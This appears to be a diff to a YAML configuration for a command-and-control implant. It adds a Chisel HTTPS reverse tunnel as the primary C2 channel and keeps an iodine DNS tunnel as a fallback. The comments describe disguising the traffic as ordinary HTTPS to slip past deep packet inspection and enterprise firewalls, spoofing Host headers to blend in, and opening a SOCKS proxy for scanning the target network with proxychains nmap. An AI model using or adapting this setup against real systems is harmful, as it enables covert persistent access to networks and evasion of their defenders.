@@ -20,7 +20,42 @@ c2:
   # Long-backoff interval after max_retries exhausted (seconds)
   backoff_interval: 300
 
-# ── DNS Tunnel (iodine) — Primary C2 ───────────────────────────
+# ── Chisel HTTPS Reverse Tunnel — Primary C2 ──────────────────
+# Multiplexed reverse port forwarding + SOCKS over a single
+# WebSocket connection on port 443.  Looks like normal HTTPS to
+# DPI — the most reliable egress through enterprise firewalls.
+#
+# chisel server must be running on the C2 server — listener.rc starts
+# it automatically.
+#
+# If forwards are omitted here, the ssh_tunnels.forwards list is
+# reused — configure in one place, both transports honour it.
+chisel:
+  enabled: true
+  # Port the chisel server listens on (c2-server side)
+  server_port: 443
+  # Shared auth — must match chisel server's --auth flag
+  auth: "landnav:changeme"
+  # Use TLS (should be true for port 443 — matches normal HTTPS)
+  tls: true
+  # SOCKS5 proxy port on the C2 server (0 = disabled)
+  # Provides proxy-based access into the target network for any tool:
+  #   proxychains nmap -sT 10.10.240.0/24
+  socks_port: 1080
+  # Reconnection tuning — chisel retries indefinitely by default
+  keepalive: 25s
+  max_retry_interval: 30s
+  # Optional HTTP headers to blend with legitimate traffic
+  # (e.g. match the Host header of a real site behind the same IP)
+  headers: {}
+  #   Host: portal.example.com
+  # Forwards (optional — if empty, inherits ssh_tunnels.forwards):
+  # forwards:
+  #   - local_port: 25100
+  #     remote_port: 5100
+  #     remote_host: 10.10.240.61
+
+# ── DNS Tunnel (iodine) — Secondary C2 ─────────────────────────
 dns_tunnel:
   enabled: true
   # Tunnel domain — NS record for this domain must point to c2.host
@@ -28,6 +63,8 @@ dns_tunnel:
   domain: t.example.com
   # Shared secret between iodine client and iodined server
   password: changeme
+  # Tunnel network (iodined server-side subnet for the dns0 interface)
+  tunnel_net: 10.53.53.1/24
   # Maximum downstream fragment size (auto-detected if 0)
   max_downstream_frag: 0
   # Encoding: NULL, BASE32, BASE64, BASE128, RAW
